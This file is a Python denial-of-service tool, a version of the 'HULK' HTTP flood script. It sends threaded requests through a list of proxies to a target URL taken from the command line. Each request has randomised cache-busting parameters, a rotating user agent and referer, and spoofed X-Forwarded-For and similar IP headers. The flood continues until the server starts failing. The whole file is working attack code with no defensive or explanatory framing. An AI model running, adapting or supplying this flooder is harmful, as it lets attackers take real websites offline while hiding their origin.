import urllib.request as urllib2
import sys
import threading
import random
import re
import secrets
import string

# Global parameters
url = ''
host = ''
headers_useragents = []
headers_referers = []
request_counter = 0
flag = 0
safe = 0
proxies = []

def inc_counter():
    global request_counter
    request_counter += 1

def set_flag(val):
    global flag
    flag = val

def set_safe():
    global safe
    safe = 1

# Generates a user agent array
def useragent_list():
    global headers_useragents
    headers_useragents.extend([
        'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3',
        'Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)',
        'Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)',
        'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1',
        'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1',
        'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)',
        'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)',
        'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)',
        'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 2.0.50727; InfoPath.2)',
        'Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)',
        'Mozilla/4.0 (compatible; MSIE 6.1; Windows XP)',
        'Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51'
    ])
    return headers_useragents

# Generates a referer array
def referer_list():
    global headers_referers
    headers_referers.extend([
        'http://www.google.com/?q=',
        'http://www.usatoday.com/search/results?q=',
        'http://engadget.search.aol.com/search?q=',
        'http://' + host + '/'
    ])
    return headers_referers

# Build random IP
def generate_random_ip():
    return f"{random.randint(1, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}"

# Build random data
def generate_random_string():
    byte_length = random.randint(1000, 2000)
    characters = string.ascii_letters + string.digits + string.punctuation
    random_bytes = secrets.token_bytes(byte_length)
    return ''.join([characters[b % len(characters)] for b in random_bytes])

# Build random ASCII string
def buildblock(size):
    return ''.join(chr(random.randint(65, 90)) for _ in range(size))

# Usage function
def usage():
    print('USAGE: python test.py <url>')
    print('You can add "safe" after url, to autoshut after DoS')

# Load proxies from proxy.txt
def load_proxies():
    global proxies
    try:
        with open('proxy.txt', 'r') as file: #proxy file needed
            proxies = [line.strip() for line in file.readlines()]
    except FileNotFoundError:
        print("proxy.txt file not found.")
        sys.exit()

# HTTP request with proxy
def httpcall(url, proxy):
    useragent_list()
    referer_list()
    code = 0
    if url.count("?") > 0:
        param_joiner = "&"
    else:
        param_joiner = "?"
    
    request = urllib2.Request(url + param_joiner + buildblock(random.randint(3, 10)) + '=' + buildblock(random.randint(3, 10)))
    request.add_header('User-Agent', random.choice(headers_useragents))
    request.add_header('X-Forwarded-DATA', generate_random_string())
    request.add_header('Cache-Control', 'no-cache')
    request.add_header('Accept-Charset', 'ISO-8859-1,utf-8;q=0.7,*;q=0.7')
    request.add_header('Referer', random.choice(headers_referers) + buildblock(random.randint(5, 10)))
    request.add_header('Keep-Alive', random.randint(110, 120))
    request.add_header('Connection', 'keep-alive')
    request.add_header('Host', host)
    request.add_header('X-Forwarded-For', generate_random_ip())
    request.add_header('X-Real-IP', generate_random_ip())
    request.add_header('X-Client-IP', generate_random_ip())
    request.add_header('X-Forwarded-Host', generate_random_ip())
    request.add_header('X-Originating-IP', generate_random_ip())
    request.add_header('X-Remote-IP', generate_random_ip())
    request.add_header('X-Remote-Addr', generate_random_ip())
    
    proxy_support = urllib2.ProxyHandler({
        'http': f'http://{proxy}',
        'https': f'http://{proxy}'
    })
    opener = urllib2.build_opener(proxy_support)
    urllib2.install_opener(opener)
    
    try:
        response = urllib2.urlopen(request)
    except urllib2.HTTPError as e:
        set_flag(1)
        print(f'Response Code 500 for proxy {proxy}')
        code = 500
    except urllib2.URLError as e:
        print(f'Failed proxy {proxy}: {e}')
        return None
    else:
        inc_counter()
        return code

# HTTP caller thread
class HTTPThread(threading.Thread):
    def __init__(self, proxy):
        threading.Thread.__init__(self)
        self.proxy = proxy

    def run(self):
        try:
            while flag < 2:
                code = httpcall(url, self.proxy)
                if code == 500 and safe == 1:
                    set_flag(2)
        except Exception as ex:
            pass

# Monitors HTTP threads and counts requests
class MonitorThread(threading.Thread):
    def run(self):
        previous = request_counter
        while flag == 0:
            if previous + 100 < request_counter and previous != request_counter:
                print(f"{request_counter} Requests Sent")
                previous = request_counter
        if flag == 2:
            print("\n-- HULK Attack Finished --")

# Execute
if len(sys.argv) < 2:
    usage()
    sys.exit()
else:
    if sys.argv[1] == "help":
        usage()
        sys.exit()
    else:
        print("-- HULK Attack Started --")
        if len(sys.argv) == 3:
            if sys.argv[2] == "safe":
                set_safe()
        url = sys.argv[1]
        if url.count("/") == 2:
            url = url + "/"
        m = re.search('(https?\://)?([^/]*)/?.*', url)
        host = m.group(2)
        
        load_proxies()
        
        threads = []
        for proxy in proxies:
            t = HTTPThread(proxy)
            t.start()
            threads.append(t)
        
        t = MonitorThread()
        t.start()
        
        for t in threads:
            t.join()
